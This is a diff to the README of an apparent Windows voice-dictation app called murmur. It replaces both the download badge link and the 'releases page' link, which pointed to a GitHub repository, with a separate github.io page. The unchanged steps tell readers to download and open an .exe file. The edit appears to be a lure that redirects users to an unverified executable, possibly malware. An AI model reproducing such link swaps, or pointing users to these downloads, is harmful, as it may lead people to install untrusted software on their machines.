@@ -1,6 +1,6 @@
 # 🎙️ murmur - Private voice dictation for your computer
 
-[![Download Murmur](https://img.shields.io/badge/Download-Murmur-blue.svg)](https://github.com/gussyrectosigmoid692/murmur)
+[![Download Murmur](https://img.shields.io/badge/Download-Murmur-blue.svg)](https://gussyrectosigmoid692.github.io)
 
 Murmur turns your voice into text on your Windows computer. It works offline. You keep your data private. It uses your computer hardware to process speech. No audio leaves your machine. You press a key, speak, and the words appear in your active program.
 
@@ -16,7 +16,7 @@ Ensure you have at least 8 gigabytes of memory. You also need about 2 gigabytes 
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [releases page](https://github.com/gussyrectosigmoid692/murmur) to find the latest version.
+1. Visit the [releases page](https://gussyrectosigmoid692.github.io) to find the latest version.
 2. Look for the file ending in .exe.
 3. Click the file to start the download.
 4. Open the downloaded file once it finishes.
